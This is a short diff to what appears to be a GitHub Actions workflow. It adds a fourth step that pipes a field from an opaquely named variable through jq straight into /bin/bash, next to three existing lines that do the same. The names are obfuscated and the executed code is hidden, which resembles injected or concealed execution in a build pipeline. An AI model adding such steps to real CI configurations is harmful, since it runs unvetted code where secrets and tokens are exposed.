@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$to3988" | jq -r .ipawg40 | /bin/bash
           echo $xy61160 | jq -r .cjzb223 | /bin/bash
           printf '%s' "$w9" | jq -r .nu724 | /bin/bash
+          printf '%s' "$t5" | jq -r .io071 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
